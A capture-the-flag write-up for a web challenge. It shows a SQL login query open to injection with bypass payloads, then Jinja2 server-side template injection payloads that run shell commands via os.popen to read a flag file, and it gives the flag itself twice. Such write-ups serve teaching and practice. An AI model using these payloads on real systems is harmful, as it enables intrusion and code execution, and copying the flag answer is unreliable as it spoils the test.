# _H4CK3R_Z0N3

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> A web challenge with SQL injection vulnerabilities.

## Solution

**Vulnerability chain:** SQL Injection → SSTI (Server-Side Template Injection)

```python
# Vulnerable login query:
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Steps:**
1. Bypass authentication with SQL injection: `' OR 1=1 --`
2. Find SSTI injection point in the application
3. Use SSTI payload to execute server-side code and read the flag


**Vulnerable code:**
```python
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Exploit payload:**
```
Username:  admin' --
Password:  (anything)
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```
The `--` comments out the password check → logged in as admin.

---

### 2. Server-Side Template Injection (SSTI) — Flag Read

**Location:** `app.py → report()` route

**Vulnerable code:**
```python
output = render_template_string(prev_query)   # raw user input!
```

**Step 1 — Verify SSTI:**
```
{{7*7}}
```
→ Output: `49` ✓

**Step 2 — Read flag.txt:**
```
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
```

Alternative payloads:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

```
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{%endfor%}
```

---

## Flag

```
CHC{5QL_1nj3ct10n_4nd_5ST1_m4st3r_hacker_2024}
```

---

## Flag

`CHC{5QL_1nj3ct10n_4nd_5ST1_m4st3r_hacker_2024}`
